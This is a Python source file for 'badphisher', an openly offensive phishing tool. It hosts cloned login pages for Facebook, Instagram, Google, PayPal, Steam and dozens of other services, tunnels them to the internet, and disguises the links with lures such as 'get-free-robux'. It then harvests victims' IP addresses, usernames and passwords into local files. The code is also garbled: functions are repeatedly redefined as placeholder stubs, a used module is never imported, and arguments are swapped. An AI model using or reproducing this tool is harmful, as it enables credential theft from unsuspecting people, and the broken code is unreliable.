import os
import shutil
import sys
import signal
import subprocess
import requests
import tarfile
import time
import zipfile
import platform

version = "1.0.0"
HOST = '127.0.0.1'
PORT = '8080'

# ANSI colors (FG & BG)
RED = '\033[31m'
GREEN = '\033[32m'
ORANGE = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
BLACK = '\033[30m'
REDBG = '\033[41m'
GREENBG = '\033[42m'
ORANGEBG = '\033[43m'
BLUEBG = '\033[44m'
MAGENTABG = '\033[45m'
CYANBG = '\033[46m'
WHITEBG = '\033[47m'
BLACKBG = '\033[40m'
RESETBG = '\033[0m\n'

# Directories
BASE_DIR = os.path.realpath(os.path.dirname(__file__))

# Create directories if they don't exist
server_dir = os.path.join(BASE_DIR, ".server")
auth_dir = os.path.join(BASE_DIR, "auth")
www_dir = os.path.join(server_dir, "www")

os.makedirs(server_dir, exist_ok=True)
os.makedirs(auth_dir, exist_ok=True)

# Remove www directory if it exists and recreate it
if os.path.exists(www_dir):
    shutil.rmtree(www_dir)
os.makedirs(www_dir)

# Remove logfile
logfile_loclx = os.path.join(server_dir, ".loclx")
logfile_cld = os.path.join(server_dir, ".cld.log")

for logfile in [logfile_loclx, logfile_cld]:
    if os.path.exists(logfile):
        os.remove(logfile)
        
# ANSI colors (FG & BG)
RED = '\033[31m'
WHITE = '\033[37m'
RESET = '\033[0m'

def reset_color():
    """Reset terminal colors."""
    print(f"{RESET}", end='')

def exit_on_signal(signum, frame):
    """Exit handler for SIGINT and SIGTERM."""
    if signum == signal.SIGINT:
        print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Interrupted.")
    elif signum == signal.SIGTERM:
        print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Program Terminated.")
    
    reset_color()
    sys.exit(0)

# Set up signal handlers
signal.signal(signal.SIGINT, exit_on_signal)
signal.signal(signal.SIGTERM, exit_on_signal)

def kill_pid():
    """Kill already running processes."""
    check_pid = ["php", "cloudflared", "loclx"]
    
    for process in check_pid:
        try:
            # Check if the process is running
            pid = subprocess.check_output(["pidof", process]).strip()
            if pid:
                # Kill the process
                subprocess.run(["killall", process], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            # Process is not running, ignore
            pass

def check_update(version, base_dir):
    """Check for a newer release and update if available."""
    release_url = 'https://github.com/Blessed2008/badphisher/commits/badphisher'
    
    print("\n[+] Checking for update: ", end="")
    
    try:
        response = requests.get(release_url)
        response.raise_for_status()
        new_version = response.json()["badphisher"]
        
        tarball_url = f"https://github.com/Blessed2008/badphisher/archive/refs/tags/badphisher.tar.gz"
        
        if new_version != version:
            print("update found")
            time.sleep(2)
            print("[+] Downloading Update...")
            
            # Download the update
            tarball_path = os.path.join(os.path.expanduser("~"), ".badphisher.tar.gz")
            download_response = requests.get(tarball_url, allow_redirects=True)
            download_response.raise_for_status()
            
            with open(tarball_path, 'wb') as f:
                f.write(download_response.content)

            # Extract the tarball
            if os.path.exists(tarball_path):
                with tarfile.open(tarball_path) as tar:
                    tar.extractall(path=base_dir)
                
                os.remove(tarball_path)
                time.sleep(3)
                clear_console()
                print("\n[+] Successfully updated! Run badphisher phisher again\n")
                exit(1)
            else:
                print("[!] Error occurred while downloading.")
                exit(1)
        else:
            print("up to date")
            time.sleep(0.5)
    except requests.RequestException as e:
        print(f"[!] Error occurred: {e}")
        exit(1)

def clear_console():
    """Clear the console."""
    os.system('cls' if os.name == 'nt' else 'clear')
   
def check_status():
    """Check internet status and call check_update if online."""
    print("\n[+] Internet Status: ", end="")
    
    try:
        response = requests.head("https://api.github.com", timeout=3)
        response.raise_for_status()  # Raise an error for bad responses
        
        print("Online")
        # Call check_update function here with current version and base directory
        current_version = "v1.0.0"  # Replace with actual version
        base_directory = "badphisher"     # Replace with actual base directory
        check_update(current_version, base_directory)
        
    except requests.RequestException:
        print("Offline")
        
def install_package(package):
    """Install a package using the appropriate package manager."""
    try:
        if os.path.exists("/data/data/com.termux/files/home"):
            # Check for proot and ncurses-utils
            if not is_command_available("proot"):
                print(f"\n[+] Installing package: proot")
                subprocess.run(["pkg", "install", "proot", "resolv-conf", "-y"], check=True)

            if not is_command_available("tput"):
                print(f"\n[+] Installing package: ncurses-utils")
                subprocess.run(["pkg", "install", "ncurses-utils", "-y"], check=True)

        # List of required packages
        required_packages = ["php", "curl", "unzip"]
        for pkg in required_packages:
            if not is_command_available(pkg):
                print(f"\n[+] Installing package: {pkg}")
                install_with_package_manager(pkg)

    except subprocess.CalledProcessError as e:
        print(f"[!] Error installing packages: {e}")
        sys.exit(1)

def is_command_available(command):
    """Check if a command is available in the system."""
    return subprocess.call(["command", "-v", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

def install_with_package_manager(package):
    """Install a package using the appropriate package manager."""
    package_managers = {
        "pkg": ["pkg", "install", package, "-y"],
        "apt": ["sudo", "apt", "install", package, "-y"],
        "apt-get": ["sudo", "apt-get", "install", package, "-y"],
        "pacman": ["sudo", "pacman", "-S", package, "--noconfirm"],
        "dnf": ["sudo", "dnf", "-y", "install", package],
        "yum": ["sudo", "yum", "-y", "install", package]
    }

    for manager, command in package_managers.items():
        if is_command_available(manager):
            subprocess.run(command, check=True)
            return

    print(f"[!] Unsupported package manager. Install packages manually.")
    sys.exit(1)
    
def download(url, output):
    """Download a file from a URL and extract it if necessary."""
    file_name = os.path.basename(url)

    # Remove existing files if they exist
    if os.path.exists(file_name) or os.path.exists(output):
        os.remove(file_name)
        os.remove(output)

    try:
        # Download the file
        response = requests.get(url, allow_redirects=True, verify=False)
        response.raise_for_status()  # Raise an error for bad responses

        with open(file_name, 'wb') as file:
            file.write(response.content)

        # Check the file extension and extract if necessary
        if file_name.endswith('.zip'):
            with zipfile.ZipFile(file_name, 'r') as zip_ref:
                zip_ref.extractall('.server')
                shutil.move(os.path.join('.server', output), '.server/')
        elif file_name.endswith('.tgz'):
            with tarfile.open(file_name, 'r:gz') as tar_ref:
                tar_ref.extractall('.server')
                shutil.move(os.path.join('.server', output), '.server/')
        else:
            shutil.move(file_name, os.path.join('.server', output))

        # Make the output executable
        os.chmod(os.path.join('.server', output), 0o755)

    except Exception as e:
        print(f"\n[!] Error occurred while downloading {output}: {e}")
        exit(1)
        
 
def install_cloudflared():
    """Install Cloudflared."""
    if os.path.exists(".server/cloudflared"):
        print("\n[+] Cloudflared already installed.")
    else:
        print("\n[+] Installing Cloudflared...")
        arch = platform.machine()

        if 'arm' in arch or 'Android' in arch:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm', 'cloudflared')
        elif arch == 'aarch64':
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64', 'cloudflared')
        elif arch == 'x86_64':
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64', 'cloudflared')
        else:
            download('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386', 'cloudflared')

def install_localxpose():
    """Install LocalXpose."""
    if os.path.exists(".server/loclx"):
        print("\n[+] LocalXpose already installed.")
    else:
        print("\n[+] Installing LocalXpose...")
        arch = platform.machine()

        if 'arm' in arch or 'Android' in arch:
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip', 'loclx')
        elif arch == 'aarch64':
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip', 'loclx')
        elif arch == 'x86_64':
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip', 'loclx')
        else:
            download('https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip', 'loclx')
            

def clear_console():
    """Clear the console based on the operating system."""
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    """Display a banner. Customize this function as needed."""
    print("°|=======Badphisher=======|°")
def reset_color():
    """Reset terminal colors. Customize this function as needed."""
    # In a terminal, you would typically reset colors here.
    pass

def msg_exit():
    """Display exit message and terminate the program."""
    clear_console()
    banner()
    print("\nThank you for using this tool. Have a good day.\n")
    reset_color()
    sys.exit(0)
    
# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
ORANGE = "\033[33m"
GREEN = "\033[32m"
CYAN = "\033[36m"
BLUE = "\033[34m"
RESET = "\033[0m"

# Default port
PORT = 8080  # Set a default port

def clear_console():
    """Clear the console based on the operating system."""
    os.system('cls' if os.name == 'nt' else 'clear')
    
def banner_small():
    """Display a small banner. Customize this function as needed."""
    print("=========badphisher========= ")

def choose_custom_port():
    global PORT
    print()
    P_ANS = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Do You Want A Custom Port {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}").strip().lower()
    
    if P_ANS == 'y':
        print("\n")
        CU_P = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Enter Your Custom 4-digit Port [1024-9999]: {WHITE}")
        
        # Validate the custom port input
        if CU_P.isdigit() and len(CU_P) == 4 and 1024 <= int(CU_P) <= 9999:
            PORT = int(CU_P)
            print()
        else:
            print(f"\n\n{RED}[{WHITE}!{RED}]{RED} Invalid 4-digit Port: {CU_P}, Try Again...{WHITE}")
            time.sleep(2)
            clear_console()
            banner_small()
            choose_custom_port()
    else:
        print(f"\n\n{RED}[{WHITE}-{RED}]{BLUE} Using Default Port {PORT}...{WHITE}\n")

def setup_site(website, host):
    """Set up the website and start the PHP server."""
    print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Setting up server...{WHITE}")
    
    # Copy files (simulated here)
    subprocess.run(['cp', '-r', f'.sites/{website}/.', '.server/www/'])
    subprocess.run(['cp', '-f', '.sites/ip.php', '.server/www/'])
    
    print(f"{RED}[{WHITE}-{RED}]{BLUE} Starting PHP server...{WHITE}")
    
    # Start the PHP server
    os.chdir('.server/www')
    subprocess.Popen(['php', '-S', f'{host}:{PORT}'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    

# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
GREEN = "\033[32m"
BLUE = "\033[34m"
ORANGE = "\033[33m"
RESET = "\033[0m"

def capture_ip():
    """Capture the IP address from the ip.txt file and save it."""
    try:
        with open('.server/www/ip.txt', 'r') as ip_file:
            ip_data = ip_file.read()
            # Extract IP using regex
            ip_match = re.search(r'IP: (\S+)', ip_data)
            if ip_match:
                ip = ip_match.group(1).strip()
                print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Victim's IP : {BLUE}{ip}")
                print(f"{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/ip.txt")
                
                # Append IP to auth/ip.txt
                with open('auth/ip.txt', 'a') as auth_ip_file:
                    auth_ip_file.write(ip + '\n')
            else:
                print(f"{RED}[{WHITE}!{RED}]{WHITE} No IP found in .server/www/ip.txt")
    except FileNotFoundError:
        print(f"{RED}[{WHITE}!{RED}]{WHITE} File not found: .server/www/ip.txt")

def capture_creds():
    """Capture credentials from usernames.txt and save them."""
    try:
        with open('.server/www/usernames.txt', 'r') as creds_file:
            creds_data = creds_file.read()
            
            # Extract username and password using regex
            account_match = re.search(r'Username:\s*(\S+)', creds_data)
            password_match = re.search(r'Pass:\s*(\S+)', creds_data)

            if account_match and password_match:
                account = account_match.group(1).strip()
                password = password_match.group(1).strip()
                
                print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Account : {BLUE}{account}")
                print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Password : {BLUE}{password}")
                print(f"\n{RED}[{WHITE}-{RED}]{BLUE} Saved in : {ORANGE}auth/usernames.dat")
                
                # Append credentials to auth/usernames.dat
                with open('auth/usernames.dat', 'a') as auth_creds_file:
                    auth_creds_file.write(f"Username: {account}, Password: {password}\n")
                
                print(f"{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Next Login Info, {BLUE}Ctrl + C {ORANGE}to exit.")
            else:
                print(f"{RED}[{WHITE}!{RED}]{WHITE} No credentials found in .server/www/usernames.txt")
    except FileNotFoundError:
        print(f"{RED}[{WHITE}!{RED}]{WHITE} File not found: .server/www/usernames.txt")
        
# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
GREEN = "\033[32m"
BLUE = "\033[34m"
ORANGE = "\033[33m"
CYAN = "\033[36m"
RESET = "\033[0m"

HOST = "localhost"  # Set your host here
PORT = "8080"       # Set your port here

def capture_data():
    """Continuously check for IP and login information."""
    print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit...")
    while True:
        if os.path.exists(".server/www/ip.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found !")
            capture_ip()
            os.remove(".server/www/ip.txt")
        
        time.sleep(0.75)

        if os.path.exists(".server/www/usernames.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found !!")
            capture_creds()
            os.remove(".server/www/usernames.txt")
        
        time.sleep(0.75)

def start_cloudflared():
    """Start the Cloudflared tunnel."""
    try:
        if os.path.exists(".cld.log"):
            os.remove(".cld.log")

        print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
        time.sleep(1)  # Simulate setup_site() function

        print(f"{RED}[{WHITE}-{RED}]{GREEN} Launching Cloudflared...")
        command = f"./.server/cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log"
        
        if subprocess.run(["command", "-v", "termux-chroot"], stdout=subprocess.PIPE).returncode == 0:
            command = f"termux-chroot {command}"
        
        subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(8)
        with open(".server/.cld.log", "r") as log_file:
            log_data = log_file.read()
            cldflr_url_match = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_data)
            if cldflr_url_match:
                cldflr_url = cldflr_url_match.group(0)
                custom_url(cldflr_url)  # Define this function to handle the URL
                capture_data()
    except Exception as e:
        print(f"{RED}[{WHITE}!{RED}]{WHITE} Error starting Cloudflared: {e}")

def localxpose_auth():
    """Authenticate with LocalXpose."""
    subprocess.Popen(["./.server/loclx", "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

    auth_f = ".localxpose/.access" if os.path.isdir(".localxpose") else f"{os.path.expanduser('~')}/.localxpose/.access"

    try:
        result = subprocess.run(["./.server/loclx", "account", "status"], capture_output=True, text=True)
        if "Error" in result.stdout:
            print(f"\n\n{RED}[{WHITE}!{RED}]{GREEN} Create an account on {ORANGE}localxpose.io{GREEN} & copy the token\n")
            time.sleep(3)
            loclx_token = input(f"{RED}[{WHITE}-{RED}]{ORANGE} Input Loclx Token: {ORANGE}").strip()
            if loclx_token == "":
                print(f"\n{RED}[{WHITE}!{RED}]{RED} You have to input Localxpose Token.")
                time.sleep(2)
                tunnel_menu()  # Define this function to handle the menu
            else:
                with open(auth_f, "w") as auth_file:
                    auth_file.write(loclx_token)
    except Exception as e:
        print(f"{RED}[{WHITE}!{RED}]{WHITE} Error during LocalXpose authentication: {e}")
        
     
# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
GREEN = "\033[32m"
CYAN = "\033[36m"
ORANGE = "\033[33m"
RESET = "\033[0m"

HOST = "localhost"  # Set your host here
PORT = "8080"       # Set your port here

def cusport():
    """Function to set or customize the port (placeholder)."""
    # Implement the logic to customize the port if needed
    pass

def setup_site():
    """Function to set up the site (placeholder)."""
    # Implement the logic to set up the site
    pass

def custom_url(loclx_url):
    """Handle the custom URL (placeholder)."""
    print(f"{RED}[{WHITE}-{RED}]{GREEN} LocalXpose URL: {CYAN}{loclx_url}{RESET}")

def capture_data():
    """Continuously check for IP and login information."""
    print(f"\n{RED}[{WHITE}-{RED}]{ORANGE} Waiting for Login Info, {BLUE}Ctrl + C {ORANGE}to exit...")
    while True:
        if os.path.exists(".server/www/ip.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Victim IP Found!")
            capture_ip()  # Define this function
            os.remove(".server/www/ip.txt")
        
        time.sleep(0.75)

        if os.path.exists(".server/www/usernames.txt"):
            print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Login info Found!!")
            capture_creds()  # Define this function
            os.remove(".server/www/usernames.txt")
        
        time.sleep(0.75)

def start_loclx():
    """Start LocalXpose tunnel."""
    cusport()
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
    time.sleep(1)
    
    setup_site()
    time.sleep(1)

    opinion = input(f"{RED}[{WHITE}?{RED}]{ORANGE} Change Loclx Server Region? {GREEN}[{CYAN}y{GREEN}/{CYAN}N{GREEN}]: {ORANGE}").strip().lower()
    loclx_region = "eu" if opinion == "y" else "us"

    print(f"\n\n{RED}[{WHITE}-{RED}]{GREEN} Launching LocalXpose...")
    
    command = f"./.server/loclx tunnel --raw-mode http --region {loclx_region} --https-redirect -t {HOST}:{PORT}"
    
    if subprocess.run(["command", "-v", "termux-chroot"], stdout=subprocess.PIPE).returncode == 0:
        command = f"termux-chroot {command}"

    with open(".server/.loclx", "w") as loclx_file:
        subprocess.Popen(command, shell=True, stdout=loclx_file, stderr=subprocess.STDOUT)

    time.sleep(12)
    
    with open(".server/.loclx", "r") as loclx_file:
        loclx_data = loclx_file.read()
        loclx_url_match = re.search(r'[0-9a-zA-Z.]*\.loclx\.io', loclx_data)
        if loclx_url_match:
            loclx_url = loclx_url_match.group(0)
            custom_url(loclx_url)
            capture_data()

def start_localhost():
    """Start localhost server."""
    cusport()
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Initializing... {GREEN}( {CYAN}http://{HOST}:{PORT} {GREEN})")
    
    setup_site()
    
    time.sleep(1)
    os.system('clear')  # Simulate clearing the terminal
    print(f"\n{RED}[{WHITE}-{RED}]{GREEN} Successfully Hosted at: {GREEN}{CYAN}http://{HOST}:{PORT}{RESET}")
    
    capture_data()

# Define colors for terminal output
RED = "\033[31m"
WHITE = "\033[37m"
GREEN = "\033[32m"
ORANGE = "\033[33m"
BLUE = "\033[34m"

def banner_small():
    """Display a small banner (placeholder)."""
    print(f"{GREEN}=== Tunnel Selection ==={RESET}")

def start_localhost():
    """Start localhost server (placeholder)."""
    print("Starting localhost...")  # Replace with actual implementation

def start_cloudflared():
    """Start Cloudflared (placeholder)."""
    print("Starting Cloudflared...")  # Replace with actual implementation

def start_loclx():
    """Start LocalXpose (placeholder)."""
    print("Starting LocalXpose...")  # Replace with actual implementation

def tunnel_menu():
    """Display the tunnel selection menu."""
    os.system('clear')  # Clear the terminal
    banner_small()
    
    print(f"""
        {RED}[{WHITE}01{RED}]{ORANGE} Localhost
        {RED}[{WHITE}02{RED}]{ORANGE} Cloudflared  {RED}[{CYAN}Auto Detects{RED}]
        {RED}[{WHITE}03{RED}]{ORANGE} LocalXpose   {RED}[{CYAN}NEW! Max 15Min{RED}]
    """)

    reply = input(f"{RED}[{WHITE}-{RED}]{GREEN} Select a port forwarding service : {BLUE}")

    if reply in ('1', '01'):
        start_localhost()
    elif reply in ('2', '02'):
        start_cloudflared()
    elif reply in ('3', '03'):
        start_loclx()
    else:
        print(f"\n{RED}[{WHITE}!{RED}]{RED} Invalid Option, Try Again...")
        time.sleep(1)
        tunnel_menu()  # Recursively call to show the menu again
        
def custom_mask():
    mask = "https://default-url.com"  # Default mask URL
    mask_op = input("[?] Do you want to change Mask URL? [y/N]: ").strip().lower()
    
    if mask_op == "y":
        print("\n[-] Enter your custom URL below (Example: https://get-free-followers.com)\n")
        mask_url = input(" ==> ")
        
        # Validate the URL
        if (mask_url.startswith("http://") or mask_url.startswith("https://")) and \
           all(c not in mask_url for c in ['~', '!', '@', '%', ':', '=', '#', ';', '^', '*', '"', "'", '|', '?', '+', '<', '>', '(', ')', '{', '}', '\\']):
            mask = mask_url
            print(f"\n[-] Using custom Masked Url: {mask}")
        else:
            print("\n[!] Invalid url type.. Using the Default one..")
    
    return mask

def site_stat(url):
    if url:
        try:
            response = requests.head(url, allow_redirects=True)
            return response.status_code
        except requests.RequestException as e:
            print(f"Error checking site status: {e}")
            return None

def shorten(url, service_url):
    try:
        response = requests.get(service_url + url, timeout=10)
        response.raise_for_status()
        
        # Process the response based on the shortening service
        if "shrtco.de" in service_url:
            short_link = response.json().get('result', {}).get('short_link2')
            return short_link
        else:
            return response.url  # For other services, simply return the final URL
    except requests.RequestException as e:
        print(f"Error shortening URL: {e}")
        return None
        
def custom_url(url):
    url = url.split("://")[-1]  # Remove the scheme (http or https)
    isgd = "https://is.gd/create.php?format=simple&url="
    shortcode = "https://api.shrtco.de/v2/shorten?url="
    tinyurl = "https://tinyurl.com/api-create.php?url="

    mask = custom_mask()  # Call to get the custom mask
    time.sleep(1)  # Sleep for 1 second
    clear_screen()  # Clear the screen (implement this function as needed)

    if re.search(r"[-a-zA-Z0-9.]*?(trycloudflare\.com|loclx\.io)", url):
        processed_url = None
        
        if site_stat(isgd) == 200:
            processed_url = shorten(isgd, url)
        elif site_stat(shortcode) == 200:
            processed_url = shorten(shortcode, url)
        else:
            processed_url = shorten(tinyurl, url)

        url = f"https://{url}"
        masked_url = f"{mask}@{processed_url}"
        processed_url = f"https://{processed_url}"
    else:
        url = "Unable to generate links. Try after turning on hotspot"
        processed_url = "Unable to Short URL"

    print(f"\n[ - ] URL 1 : {url}")
    print(f"\n[ - ] URL 2 : {processed_url}")
    if "Unable" not in processed_url:
        print(f"\n[ - ] URL 3 : {masked_url}")
        
def site_facebook():
    options = {
        "1": ("facebook", "https://blue-verified-badge-for-facebook-free"),
        "2": ("fb_advanced", "https://vote-for-the-best-social-media"),
        "3": ("fb_security", "https://make-your-facebook-secured-and-free-from-hackers"),
        "4": ("fb_messenger", "https://get-messenger-premium-features-free"),
    }

    print("\nSelect an option:")
    for key, (website, mask) in options.items():
        print(f"[{key}] {mask}")

    reply = input("[ - ] Select an option: ")
    
    if reply in options:
        website, mask = options[reply]
        tunnel_menu(website, mask)  # Call the tunnel_menu function with parameters
    else:
        print("\n[!] Invalid Option, Try Again...")
        time.sleep(1)
        clear_screen()  # Clear the screen (implement this function as needed)
        site_facebook()  # Recursively call to show the options again

def clear_screen():
    # Implement your screen clearing logic here
    pass

def custom_mask():
    # Implement your custom mask logic here
    return "default_mask"  # Placeholder return value

def site_stat(url):
    try:
        response = requests.head(url, allow_redirects=True)
        return response.status_code
    except requests.RequestException as e:
        print(f"Error checking site status: {e}")
        return None

def shorten(service_url, url):
    try:
        response = requests.get(service_url + url, timeout=10)
        response.raise_for_status()

        if "shrtco.de" in service_url:
            return response.json().get('result', {}).get('short_link2')
        else:
            return response.url  # For other services, simply return the final URL
    except requests.RequestException as e:
        print(f"Error shortening URL: {e}")
        return None

def tunnel_menu(website, mask):
    # Implement your tunnel menu logic here
    print(f"Tunneling for website: {website} with mask: {mask}")
    

def site_instagram():
    options = {
        "1": ("instagram", "https://get-unlimited-followers-for-instagram"),
        "2": ("ig_followers", "https://get-unlimited-followers-for-instagram"),
        "3": ("insta_followers", "https://get-1000-followers-for-instagram"),
        "4": ("ig_verify", "https://blue-badge-verify-for-instagram-free"),
    }

    print("\nSelect an option:")
    for key, (website, mask) in options.items():
        print(f"[{key}] {mask}")

    reply = input("[ - ] Select an option: ")

    if reply in options:
        website, mask = options[reply]
        tunnel_menu(website, mask)  # Call the tunnel_menu function with parameters
    else:
        print("\n[!] Invalid Option, Try Again...")
        time.sleep(1)
        clear_screen()  # Clear the screen (implement this function as needed)
        site_instagram()  # Recursively call to show the options again


def site_gmail():
    options = {
        "1": ("google", "https://get-unlimited-google-drive-free"),
        "2": ("google_new", "https://get-unlimited-google-drive-free"),
        "3": ("google_poll", "https://vote-for-the-best-social-media"),
    }

    print("\nSelect an option:")
    for key, (website, mask) in options.items():
        print(f"[{key}] {mask}")

    reply = input("[ - ] Select an option: ")

    if reply in options:
        website, mask = options[reply]
        tunnel_menu(website, mask)  # Call the tunnel_menu function with parameters
    else:
        print("\n[!] Invalid Option, Try Again...")
        time.sleep(1)
        clear_screen()  # Clear the screen (implement this function as needed)
        site_gmail()  # Recursively call to show the options again


def site_vk():
    options = {
        "1": ("vk", "https://vk-premium-real-method-2020"),
        "2": ("vk_poll", "https://vote-for-the-best-social-media"),
    }

    print("\nSelect an option:")
    for key, (website, mask) in options.items():
        print(f"[{key}] {mask}")

    reply = input("[ - ] Select an option: ")

    if reply in options:
        website, mask = options[reply]
        tunnel_menu(website, mask)  # Call the tunnel_menu function with parameters
    else:
        print("\n[!] Invalid Option, Try Again...")
        time.sleep(1)
        clear_screen()  # Clear the screen (implement this function as needed)
        site_vk()  # Recursively call to show the options again


def clear_screen():
    # Implement your screen clearing logic here
    pass

def tunnel_menu(website, mask):
    # Implement your tunnel menu logic here
    print(f"Tunneling for website: {website} with mask: {mask}")
    
def main_menu():
    # Clear the screen (you can implement this function as needed)
    clear_screen()
    banner()  # Display a banner (implement this function as needed)
    print()  # Print a blank line for spacing

    menu_options = [
        ("Facebook", "01"), ("Instagram", "02"), ("Google", "03"), ("Microsoft", "04"),
        ("Netflix", "05"), ("Paypal", "06"), ("Steam", "07"), ("Twitter", "08"),
        ("Playstation", "09"), ("Tiktok", "10"), ("Twitch", "11"), ("Pinterest", "12"),
        ("Snapchat", "13"), ("Linkedin", "14"), ("Ebay", "15"), ("Quora", "16"),
        ("Protonmail", "17"), ("Spotify", "18"), ("Reddit", "19"), ("Vk", "29"),
        ("Origin", "23"), ("Badoo", "22"), ("Dropbox", "24"), ("Yahoo", "25"),
        ("Wordpress", "26"), ("Yandex", "27"), ("StackoverFlow", "28"),
        ("Adobe", "20"), ("XBOX", "30"), ("Mediafire", "31"), ("Gitlab", "32"),
        ("Github", "33"), ("Discord", "34"), ("Roblox", "35")
    ]

    print("\033[31m[::]\033[33m Select An Attack For Your Victim \033[31m[::]\033[0m")
    for name, code in menu_options:
        print(f"\033[31m[{code}]\033[33m {name} ", end="")
        if int(code) % 10 == 0:  # New line after every 10 options for better formatting
            print()
    print("\033[31m[99]\033[33m About \033[31m[00]\033[33m Exit\033[0m")

    reply = input("\033[31m[-]\033[32m Select an option: \033[34m")

    # Handle the user input
    handle_selection(reply)
    
def clear_screen():
    # Implement your screen clearing logic here (e.g., os.system('cls') for Windows or os.system('clear') for Unix)
    pass
def banner():
    # Implement your banner display logic here
    print("°|=============Badphisher============|°")

def handle_selection(option):
    if option == "00":
        print("Exiting...")
        exit(0)
    elif option == "99":
        print("About section...")
        # Add logic for the About section
    else:
        print(f"You selected option: {option}")
        # Add logic for handling other selections
        

def handle_selection(option):
    website_mask_map = {
        "1": ("facebook", None),
        "2": ("instagram", None),
        "3": ("gmail", None),
        "4": ("microsoft", 'https://unlimited-onedrive-space-for-free'),
        "5": ("netflix", 'https://upgrade-your-netflix-plan-free'),
        "6": ("paypal", 'https://get-500-usd-free-to-your-account'),
        "7": ("steam", 'https://steam-500-usd-gift-card-free'),
        "8": ("twitter", 'https://get-blue-badge-on-twitter-free'),
        "9": ("playstation", 'https://playstation-500-usd-gift-card-free'),
        "10": ("tiktok", 'https://tiktok-free-liker'),
        "11": ("twitch", 'https://unlimited-twitch-tv-user-for-free'),
        "12": ("pinterest", 'https://get-a-premium-plan-for-pinterest-free'),
        "13": ("snapchat", 'https://view-locked-snapchat-accounts-secretly'),
        "14": ("linkedin", 'https://get-a-premium-plan-for-linkedin-free'),
        "15": ("ebay", 'https://get-500-usd-free-to-your-account'),
        "16": ("quora", 'https://quora-premium-for-free'),
        "17": ("protonmail", 'https://protonmail-pro-basics-for-free'),
        "18": ("spotify", 'https://convert-your-account-to-spotify-premium'),
        "19": ("reddit", 'https://reddit-official-verified-member-badge'),
        "20": ("adobe", 'https://get-adobe-lifetime-pro-membership-free'),
        "21": ("deviantart", 'https://get-500-usd-free-to-your-account'),
        "22": ("badoo", 'https://get-500-usd-free-to-your-account'),
        "23": ("origin", 'https://get-500-usd-free-to-your-account'),
        "24": ("dropbox", 'https://get-1TB-cloud-storage-free'),
        "25": ("yahoo", 'https://grab-mail-from-anyother-yahoo-account-free'),
        "26": ("wordpress", 'https://unlimited-wordpress-traffic-free'),
        "27": ("yandex", 'https://grab-mail-from-anyother-yandex-account-free'),
        "28": ("stackoverflow", 'https://get-stackoverflow-lifetime-pro-membership-free'),
        "29": ("vk", None),  # Assuming site_vk() is defined
        "30": ("xbox", 'https://get-500-usd-free-to-your-account'),
        "31": ("mediafire", 'https://get-1TB-on-mediafire-free'),
        "32": ("gitlab", 'https://get-1k-followers-on-gitlab-free'),
        "33": ("github", 'https://get-1k-followers-on-github-free'),
        "34": ("discord", 'https://get-discord-nitro-free'),
        "35": ("roblox", 'https://get-free-robux'),
        "99": ("about", None),  # Assuming about() is defined
        "0": ("exit", None),    # Assuming msg_exit() is defined
    }

    # Normalize the input
    option = option.lstrip("0")  # Remove leading zeros

    if option in website_mask_map:
        website, mask = website_mask_map[option]
        
        if mask:
            tunnel_menu(website, mask)
        elif website == "exit":
            msg_exit()  # Call the exit function
        elif website == "about":
            about()  # Call the about function
        else:
            globals()[f'site_{website}']()  # Call the respective site function
    else:
        print("\n\033[31m[!]\033[31m Invalid Option, Try Again...")
        time.sleep(1)
        main_menu()  # Assuming you have a main_menu function defined

def tunnel_menu(website, mask):
    print(f"Selected website: {website} with mask: {mask}")
    # Implement the logic for tunnel_menu here

def site_facebook():
    print("Facebook site action triggered.")
    # Implement the logic for Facebook here

def site_instagram():
    print("Instagram site action triggered.")
    # Implement the logic for Instagram here

def site_gmail():
    print("Gmail site action triggered.")
    # Implement the logic for Gmail here

# Define other site functions similarly...

def site_vk():
    print("VK site action triggered.")
